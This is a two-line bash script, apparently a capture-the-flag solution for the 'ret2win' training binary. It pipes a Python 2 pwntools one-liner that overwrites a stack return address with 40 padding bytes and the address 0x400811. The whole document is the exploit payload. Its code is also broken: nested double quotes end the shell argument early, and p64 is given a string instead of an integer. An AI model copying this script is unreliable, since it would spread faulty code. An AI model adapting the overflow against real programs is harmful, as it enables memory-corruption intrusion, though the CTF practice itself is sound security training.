#!/bin/bash

python -c "from pwn import *; print 'A'*40 + p64("0x400811")"| ./ret2win 
